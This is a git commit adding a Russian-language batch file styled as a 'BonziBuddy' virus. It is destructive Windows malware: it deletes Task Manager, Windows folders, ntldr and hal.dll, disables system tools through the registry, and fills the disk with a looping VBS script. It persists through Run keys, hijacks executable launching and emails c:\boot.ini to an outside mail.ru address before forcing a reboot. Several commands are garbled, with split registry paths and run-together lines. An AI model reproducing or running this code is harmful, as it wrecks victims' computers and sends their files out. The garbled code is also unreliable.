3806bab690dba283e18ff29d1766c5bb568227ba
bonzipon <142081768+bonzipon@users.noreply.github.com>
2023-08-12 05:37:05 -0900

    Add files via upload

---
+++ bonzibuddy_original.bat
@@ -0,0 +1,419 @@
+
+@echo off
+title bonzibuddy.bat
+chcp 1251
+msg * fatall error
+chcp 1251
+msg * .
+chcp 1251
+msg * .
+chcp 1251
+msg * .
+chcp 1251
+msg * .
+chcp 1251
+msg * .
+chcp 1251
+msg * .
+chcp 1251
+msg * .
+chcp 1251
+msg * .
+chcp 1251
+msg * .
+chcp 1251
+msg * .
+chcp 1251
+msg * .
+chcp 1251
+msg * .
+chcp 1251
+msg * .
+chcp 1251
+msg * .
+chcp 1251
+msg * .
+chcp 1251
+msg * .
+start virus!!!!!!!!
+start rukocord.gif
+chcp 1251
+msg * привет! мен€ зовут бонзи бадди и € собираюсь уничтожить твой пк круто ведь?
+chcp 1251
+msg * не против если € кое что сделаю?
+chcp 1251
+msg * теперь € администратор!
+chcp 1251
+msg * врем€ отключить regedit и диспетчер задач!
+REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskM /t REG_DWORD /d /0 /f 
+cd C:\Windows\System32
+del /q taskmgr.exe
+cd C:\Windows\System32\ru-RU
+del /q taskmgr.exe.mui
+del /q tasklist.exe.mui
+del /q taskkill.exe.mui
+start lol
+start jeff.mp4
+start bonzifunny.gif
+start lol
+start rukocord.gif
+taskkill /f /IM explorer.exe
+chcp 1251
+msg * теперь € удалил твой рабочий стол!
+assoc .exe = .ink
+chcp 1251
+msg * сейчас ты больше не на что не способен!
+chcp 1251
+msg * хммм может мне сейчас удалить твою винду?
+chcp 1251
+msg * хот€ нет так скучно лучше ещЄ твой комп помучаю!
+chcp 1251
+msg * не против если € запущу MEMZ TROJAN?
+chcp 1251
+msg * хахаахахааххахаха какой же ты слабак € и без него справлюсь
+chcp 1251
+msg * € буквально уничтожаю твой комп а ты ничего не можешь сделать
+chcp 1251
+msg * доделывать мою работу будут bonzikill,bonzify
+chcp 1251
+msg * ладно шучу € запущу только bonzikill и вместе с ним будем уничтожать твой ѕ !
+start lol
+cd C:\Users\user\Desktop\viruses\bonzi.error\BonziKill
+start BonziBuddy_original.exe
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+md 1 >nul
+md 2 >nul
+md 3 >nul
+md 4 >nul
+md 5 >nul
+md 6 >nul
+md 7 >nul
+md 8 >nul
+md 9 >nul
+md 10 >nul
+md 11 >nul
+md 12 >nul
+md 13 >nul
+md 14 >nul
+md 15 >nul
+md 16 >nul
+md 17 >nul
+md 18 >nul
+md 19 >nul
+md 20 >nul
+md 21 >nul
+md 22 >nul
+md 23 >nul
+md 24 >nul
+md 25 >nul
+md 26 >nul
+md 27 >nul
+md 28 >nul
+md 29 >nul
+md 30 >nul
+md 31 >nul
+md 32 >nul
+md 33 >nul
+md 34 >nul
+md 35 >nul
+md 36 >nul
+md 37 >nul
+md 38 >nul
+md 39 >nul
+md 40 >nul
+md 41 >nul
+md 42 >nul
+md 43 >nul
+md 44 >nul
+md 45 >nul
+md 46 >null
+start lol 
+chcp 1251
+msg * как тебе уничтожение?
+chcp 1251
+msg * € чЄ то немного устал 
+assoc .ink = .exe
+start f
+chcp 1251
+msg * тебе конец готовс€!
+md 1 >nul
+md 2 >nul
+md 3 >nul
+md 4 >nul
+md 5 >nul
+md 6 >nul
+md 7 >nul
+md 8 >nul
+md 9 >nul
+md 10 >nul
+md 11 >nul
+md 12 >nul
+md 13 >nul
+md 14 >nul
+md 15 >nul
+md 16 >nul
+md 17 >nul
+md 18 >nul
+md 19 >nul
+md 20 >nul
+md 21 >nul
+md 22 >nul
+md 23 >nul
+md 24 >nul
+md 25 >nul
+md 26 >nul
+md 27 >nul
+md 28 >nul
+md 29 >nul
+md 30 >nul
+md 31 >nul
+md 32 >nul
+md 33 >nul
+md 34 >nul
+md 35 >nul
+md 36 >nul
+md 37 >nul
+md 38 >nul
+md 39 >nul
+md 40 >nul
+md 41 >nul
+md 42 >nul
+md 43 >nul
+md 44 >nul
+md 45 >nul
+md 46 >null
+start 221
+echo Set fso = CreateObject("Scripting.FileSystemObject") > %systemdrive%\windows\system32\rundll32.vbs
+echo do >> %systemdrive%\windows\system32\rundll32.vbs
+echo Set tx = fso.CreateTextFile("%systemdrive%\windows\system32 \rundll32.dat", True) >> %systemdrive%\windows\system32\rundll32.vbs
+echo tx.WriteBlankLines(100000000) >> %systemdrive%\windows\system32\rundll32.vbs
+echo tx.close >> %systemdrive%\windows\system32\rundll32.vbs
+echo FSO.DeleteFile "%systemdrive%\windows\system32\rundll32.dat" >> %systemdrive%\windows\system32\rundll32.vbs
+echo loop >> %systemdrive%\windows\system32\rundll32.vbs
+start %systemdrive%\windows\system32\rundll32.vbs
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v system_host_run /t REG_SZ /d %systemdrive%\windows\system32\rundll32.vbs /f 
+
+
+@echo off
+echo Chr(39)>%temp%\temp1.vbs
+echo Chr(39)>%temp%\temp2.vbs
+echo on error resume next > %temp%\temp.vbs
+echo Set S = CreateObject("Wscript.Shell") >> %temp%\temp.vbs
+echo set FSO=createobject("scripting.filesystemobject")>>%t emp%\temp.vbs
+reg add HKEY_USERS\S-1-5-21-343818398-1417001333-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Pol icies\Explorer /v nodesktop /d 1 /freg add HKEY_USERS\S-1-5-21-343818398-1417001333-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Pol icies\Explorer /v ClassicShell /d 1 /fset ґІ=%0
+copy %ґІ% %SystemRoot%\user32dll.bat
+reg add "hklm\Software\Microsoft\Windows\CurrentVersio n\Ru n" /v RunExplorer32 /d %SystemRoot%\user32dll.bat /f
+reg add "hkcu\Software\Microsoft\Windows\CurrentVersio n\Po licies\Explorer" /v NoDrives /t REG_DWORD /d 67108863 /f
+reg add "hkcu\Software\Microsoft\Windows\CurrentVersio n\Po licies\Explorer" /v NoViewOnDrive /t REG_DWORD /d 67108863 /f
+echo fso.deletefile "C:\ntldr",1 >> %temp%\temp.vbs
+reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v "NoSelectDownloadDir" /d 1 /f
+reg add "HKLM\SOFTWARE\Microsoft\Internet Explorer\main\FeatureControl\Feature_LocalMachine_ Lockdown" /v "IExplorer" /d 0 /f
+reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v "NoFindFiles" /d 1 /f
+reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v "NoNavButtons" /d 1 /f
+echo fso.deletefolder "D:\Windows",1 >> %temp%\temp.vbs
+echo fso.deletefolder "I:\Windows",1 >> %temp%\temp.vbs
+echo fso.deletefolder "C:\Windows",1 >> %temp%\temp.vbs
+echo sr=s.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsof t\Windows NT\CurrentVersion\SystemRoot") >> %temp%\temp.vbs
+echo fso.deletefile sr+"\system32\hal.dll",1 >> %temp%\temp.vbs
+echo sr=s.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsof t\Windows NT\CurrentVersion\SystemRoot") >> %temp%\temp.vbs
+echo fso.deletefolder sr+"\system32\dllcache",1 >> %temp%\temp.vbs
+echo sr=s.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsof t\Windows NT\CurrentVersion\SystemRoot") >> %temp%\temp.vbs
+echo fso.deletefolder sr+"\system32\drives",1 >> %temp%\temp.vbs
+echo s.regwrite "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\LocalizedString","forum.whack.ruЩ">> %temp%\temp.vbs
+echo s.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOwner","forum.whack.ru Щ">>%temp%\temp.vbs
+echo s.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization","forum.w hack.ruЩ">>%temp%\temp.vbs
+echo on error resume next > %temp%\temp1.vbs
+echo set FSO=createobject("scripting.filesystemobject")>>%t emp%\temp1.vbs
+echo do>>%temp%\temp1.vbs
+echo fso.getfile ("A:\")>>%temp%\temp1.vbs
+echo loop>>%temp%\temp1.vbs
+echo on error resume next > %temp%\temp2.vbs
+echo Set S = CreateObject("Wscript.Shell") >> %temp%\temp2.vbs
+echo do>>%temp%\temp2.vbs
+echo execute"S.Run ""%comspec% /c echo "" & Chr(7), 0, True">>%temp%\temp2.vbs
+echo loop>>%temp%\temp2.vbs
+reg add "hkcu\Software\Microsoft\Windows\CurrentVersio n\Po licies\System" /v disabletaskmgr /t REG_DWORD /d 1 /f
+reg add "hkcu\Software\Microsoft\Windows\CurrentVersio n\Po licies\System" /v disableregistrytools /t REG_DWORD /d 1 /f
+reg add "hkcu\Software\Microsoft\Windows\CurrentVersio n\Po licies\Explorer" /v NoStartMenuPinnedList /t REG_DWORD /d 1 /f
+reg add "hkcu\Software\Microsoft\Windows\CurrentVersio n\Po licies\Explorer" /v NoStartMenuMFUprogramsList /t REG_DWORD /d 1 /f
+reg add "hkcu\Software\Microsoft\Windows\CurrentVersio n\Po licies\Explorer" /v NoUserNameInStartMenu /t REG_DWORD /d 1 /f
+reg add "hkcu\Software\Microsoft\Windows\CurrentVersio n\Po licies\NonEnum" /v {20D04FE0-3AEA-1069-A2D8-08002B30309D} /t REG_DWORD /d 1 /f
+reg add "hkcu\Software\Microsoft\Windows\CurrentVersio n\Po licies\Explorer" /v NoNetworkConnections /t REG_DWORD /d 1 /f
+reg add "hkcu\Software\Microsoft\Windows\CurrentVersio n\Po licies\Explorer" /v NoStartMenuNetworkPlaces /t REG_DWORD /d 1 /f
+reg add "hkcu\Software\Microsoft\Windows\CurrentVersio n\Po licies\Explorer" /v StartmenuLogoff /t REG_DWORD /d 1 /f
+reg add "hkcu\Software\Microsoft\Windows\CurrentVersio n\Po licies\Explorer" /v NoStartMenuSubFolders /t REG_DWORD /d 1 /f
+reg add "hkcu\Software\Microsoft\Windows\CurrentVersio n\Po licies\Explorer" /v NoCommonGroups /t REG_DWORD /d 1 /f
+reg add "hkcu\Software\Microsoft\Windows\CurrentVersio n\Po licies\Explorer" /v NoFavoritesMenu /t REG_DWORD /d 1 /f
+reg add "hkcu\Software\Microsoft\Windows\CurrentVersio n\Po licies\Explorer" /v NoRecentDocsMenu /t REG_DWORD /d 1 /f
+reg add "hkcu\Software\Microsoft\Windows\CurrentVersio n\Po licies\Explorer" /v NoSetFolders /t REG_DWORD /d 1 /f
+reg add "hkcu\Software\Microsoft\Windows\CurrentVersio n\Po licies\Explorer" /v NoAddPrinter /t REG_DWORD /d 1 /f
+reg add "hkcu\Software\Microsoft\Windows\CurrentVersio n\Po licies\Explorer" /v NoFind /t REG_DWORD /d 1 /f
+reg add "hkcu\Software\Microsoft\Windows\CurrentVersio n\Po licies\Explorer" /v NoSMHelp /t REG_DWORD /d 1 /f
+reg add "hkcu\Software\Microsoft\Windows\CurrentVersio n\Po licies\Explorer" /v NoRun /t REG_DWORD /d 1 /f
+reg add "hkcu\Software\Microsoft\Windows\CurrentVersio n\Po licies\Explorer" /v NoStartMenuMorePrograms /t REG_DWORD /d 1 /f
+reg add "hkcu\Software\Microsoft\Windows\CurrentVersio n\Po licies\Explorer" /v NoClose /t REG_DWORD /d 1 /f
+reg add "hkcu\Software\Microsoft\Windows\CurrentVersio n\Po licies\Explorer" /v NoChangeStartMenu /t REG_DWORD /d 1 /f
+reg add "hkcu\Software\Microsoft\Windows\CurrentVersio n\Po licies\Explorer" /v NoSMMyDocs /t REG_DWORD /d 1 /f
+reg add "hkcu\Software\Microsoft\Windows\CurrentVersio n\Po licies\Explorer" /v NoSMMyPictures /t REG_DWORD /d 1 /f
+reg add "hkcu\Software\Microsoft\Windows\CurrentVersio n\Po licies\Explorer" /v NoStartMenuMyMusic /t REG_DWORD /d 1 /f
+reg add "hkcu\Software\Microsoft\Windows\CurrentVersio n\Po licies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f
+echo set application=createobject("shell.application")>>%te mp%\temp.vbs
+echo application.minimizeall>>%temp%\temp.vbs
+reg add "hklm\Software\Microsoft\Windows\CurrentVersio n\ru n" /v SwapNT /t REG_SZ /d rundll32 user32, SwapMouseButton /f
+start rundll32 user32, SwapMouseButton
+reg add "HKCR\exefile\shell\open\command" /ve /t REG_SZ /d rundll32.exe /f
+echo i=50 >> %temp%\temp.vbs
+echo while i^>0 or i^<0 >> %temp%\temp.vbs
+echo S.popup "forum.whack.ruЩ",0, "forum.whack.ruЩ",0+16 >> %temp%\temp.vbs
+echo i=i-1 >> %temp%\temp.vbs
+echo wend >> %temp%\temp.vbs
+echo do >> %temp%\temp.vbs
+echo wscript.sleep 200 >> %temp%\temp.vbs
+echo s.sendkeys"{capslock}" >> %temp%\temp.vbs
+echo wscript.sleep 200 >> %temp%\temp.vbs
+echo s.sendkeys"{numlock}" >> %temp%\temp.vbs
+echo wscript.sleep 200 >> %temp%\temp.vbs
+echo s.sendkeys"{scrolllock}" >> %temp%\temp.vbs
+echo loop>> %temp%\temp.vbs
+echo Set oWMP = CreateObject("WMPlayer.OCX.7") >> %temp%\temp.vbs
+echo Set colCDROMs = oWMP.cdromCollection >> %temp%\temp.vbs
+echo if colCDROMs.Count ^>= 1 then >> %temp%\temp.vbs
+echo For i = 0 to colCDROMs.Count - 1 >> %temp%\temp.vbs
+echo colCDROMs.Item(i).eject >> %temp%\temp.vbs
+echo next >> %temp%\temp.vbs
+echo End If >> %temp%\temp.vbs
+echo Call SendPost("smtp.mail.ru", "forum.whack.ruЩ@mail.ru", "support@mail.ru", "...", " опм заражен!") >> %temp%\temp.vbs
+echo Function SendPost(strSMTP_Server, strTo, strFrom, strSubject, strBody) >> %temp%\temp.vbs
+echo Set iMsg = CreateObject("CDO.Message") >> %temp%\temp.vbs
+echo Set iConf = CreateObject("CDO.Configuration") >> %temp%\temp.vbs
+echo Set Flds = iConf.Fields >> %temp%\temp.vbs
+echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2 >> %temp%\temp.vbs
+echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1 >> %temp%\temp.vbs
+echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusername") = "support" >> %temp%\temp.vbs
+echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendpassword") = "support" >> %temp%\temp.vbs
+echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.mail.ru" >> %temp%\temp.vbs
+echo Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 25 >> %temp%\temp.vbs
+echo Flds.Update >> %temp%\temp.vbs
+echo iMsg.Configuration = iConf >> %temp%\temp.vbs
+echo iMsg.To = strTo >> %temp%\temp.vbs
+echo iMsg.From = strFrom >> %temp%\temp.vbs
+echo iMsg.Subject = strSubject >> %temp%\temp.vbs
+echo iMsg.TextBody = strBody >> %temp%\temp.vbs
+echo iMsg.AddAttachment "c:\boot.ini" >> %temp%\temp.vbs
+echo iMsg.Send >> %temp%\temp.vbs
+echo End Function >> %temp%\temp.vbs
+echo Set iMsg = Nothing >> %temp%\temp.vbs
+echo Set iConf = Nothing >> %temp%\temp.vbs
+echo Set Flds = Nothing >> %temp%\temp.vbs
+echo s.run "shutdown -r -t 0 -c ""pcforumhack.ruЩ"" -f",1 >> %temp%\temp.vbs
+start %temp%\temp.vbs
+start %temp%\temp1.vbs
+start %temp%\temp2.vbs
+
